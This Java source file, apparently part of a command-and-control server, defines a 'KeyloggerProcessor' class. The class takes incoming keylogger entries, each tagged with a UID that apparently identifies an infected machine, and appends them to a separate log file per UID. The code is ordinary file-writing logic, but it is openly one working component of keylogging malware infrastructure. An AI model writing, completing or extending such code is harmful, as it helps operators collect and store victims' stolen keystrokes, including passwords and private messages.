package c2;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

public class KeyloggerProcessor {
	private Map<String, FileWriter> writers = new HashMap<>();
	private String logdir;

	public void initialize(String logdir) {
		File file = new File(logdir);
		file.mkdirs();
		this.logdir = logdir;
	}

	public void stop() {
		for (FileWriter writer : writers.values()) {
			try {
				writer.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		writers.clear();
	}

	public boolean writeEntry(String UID, String entry) {
		try {
			FileWriter fw;
			if (writers.containsKey(UID)) {
				fw = writers.get(UID);
			} else {
				fw = new FileWriter(logdir + File.separator + UID, true);
				writers.put(UID, fw);
			}
			fw.write(entry);
			fw.flush();
			return true;
		} catch (IOException ex) {
			ex.printStackTrace();
			return false;
		}
	}
}
